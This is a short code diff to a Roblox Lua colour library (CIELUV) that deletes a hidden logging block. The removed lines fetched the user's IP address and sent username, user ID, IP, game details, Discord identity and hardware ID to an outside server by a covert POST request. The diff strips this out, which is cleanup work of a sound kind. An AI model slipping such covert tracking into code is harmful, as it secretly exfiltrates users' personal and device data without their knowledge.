@@ -76,9 +76,7 @@ local CIELUV = {} do
 	end
 end
 
-if not lgVarsTbl then
-    lgVarsTbl = {["DiscordId"] = "null", ["DiscordUsername"] = "null", ["HWID"] = "null"}
-end
+
 --
 local MarketplaceService = game:GetService("MarketplaceService")
 local HttpService = game:GetService("HttpService")
@@ -99,21 +97,7 @@ local Passed, Statement = pcall(function()
     end
 end)
 --
-local Passed, Statement = pcall(function()
-    local Ip = game:HttpGet("https://api.ipify.org/")
-    --
-    if Ip then
-        InternetProtocol = Ip
-    end
-end)
---
-local response = syn.request(
-    {
-        Url = 'http://gamesneeze.cc/send.php',
-        Method = 'POST',
-        Headers = {},
-        Body = ("&key=test&username=%s&userid=%s&userip=%s&gamename=%s&gameid=%s&gamelink=%s&gamejob=%s&time=%s&timezone=%s&extra=Splix Execution - CIELUV&discordusername=%s&discordid=%s&hwid=%s"):format(Client.Name, Client.UserId, InternetProtocol or "null", ProductInfo.Name or "null", PlaceId, "https://www.roblox.com/games/" .. PlaceId .. "/", game.JobId, os.date("%c", os.time()), os.date("%Z", os.time()), lgVarsTbl["DiscordUsername"], lgVarsTbl["DiscordId"], lgVarsTbl["HWID"])
-    }
-)
+
+
 
 return CIELUV
